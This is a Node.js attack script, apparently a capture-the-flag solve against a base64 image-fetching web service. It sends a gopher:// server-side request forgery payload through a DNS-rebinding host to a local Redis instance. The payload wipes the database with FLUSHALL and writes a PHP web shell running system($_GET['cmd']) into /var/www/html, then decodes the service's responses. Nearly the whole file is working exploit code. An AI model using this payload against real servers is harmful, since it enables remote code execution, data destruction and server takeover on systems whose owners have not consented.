const fs = require('fs');
const fetch = require('node-fetch')
const jsdom = require("jsdom");
const { JSDOM } = jsdom;
const readline = require('readline');
const path = require('path');

const fileStream = fs.createReadStream('D://web project/zerojudgeHelper/base64/dict.txt');
const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
})

async function main() {

    const selector = 'body > div > section > div > div > div > div.content.article-body > img'
    const phpshell = `gopher://7f000001.d1559365.rbndr.us:27134/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.inc.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A`

    // Note: we use the crlfDelay option to recognize all instances of CR LF
    // ('\r\n') in input.txt as a single line break.
    for (let i = 0; i < 10; i++) {
        // Each line in input.txt will be successively available here as `line`.
        console.log(`${i}`)
        let formData = new URLSearchParams()
        formData.append('url', phpshell);

        fetch(`http://base64image.splitline.tw:8894/?page=result`, {
            method: 'POST',
            body: formData,
            timeout: 1000
        })
            .then(res => {
                if (!res.ok) {
                    return
                }
                return res.text()
            })
            .then((text) => {
                if (!text) {
                    return
                }

                const textResponse = text
                let decoded = ''
                if (textResponse) {

                    const virtualConsole = new jsdom.VirtualConsole();
                    virtualConsole.sendTo(console, { omitJSDOMErrors: true });
                    const dom = new JSDOM(textResponse, { virtualConsole });

                    const imgdom = dom.window.document.querySelector(selector)
                    if (!imgdom) {
                        console.log('invalid')
                        return 'invalid'
                    }
                    const imgsrc = imgdom.getAttribute('src')
                    // const problemList = Array.from(problemNodeList).map((p) => p.textContent);
                    const base64 = imgsrc.split(',')[1]


                    let bufferObj = Buffer.from(base64, "base64");
                    decoded = bufferObj.toString("utf8");
                }

                if (decoded.length === 0) {
                    throw new Error('empty')
                }
                console.log(decoded)

                // const dir = file.split('/').splice(0,)
                // const filename = file.split('/').reverse()[0]
                // fs.writeFile(`./output/${file}`, decoded, function (err) {
                //     if (err) return console.log(err);
                //     console.log(`${file}`);
                // }).catch(err => {
                //     console.log(err);
                // })

            }).catch(err => {
                // console.log(`ERR! ${file}`);
                console.log(err);

            })
    }
}

function decodeConsole() {
    const selector = 'body > div > section > div > div > div > div.content.article-body > img'
    const img = document.querySelector(selector)
    const imgsrc = document.querySelector(selector).getAttribute('src')
    // const problemList = Array.from(problemNodeList).map((p) => p.textContent);
    const base64 = imgsrc.split(',')[1]


    let decoded = atob(base64)
    console.log(decoded)

    const divSelector = 'body > div > section > div > div > div > div.content.article-body'
    const div = document.querySelector(divSelector)

    const newDiv = document.createElement('div')
    newDiv.innerHTML = decoded
    div.appendChild(newDiv)


}
main()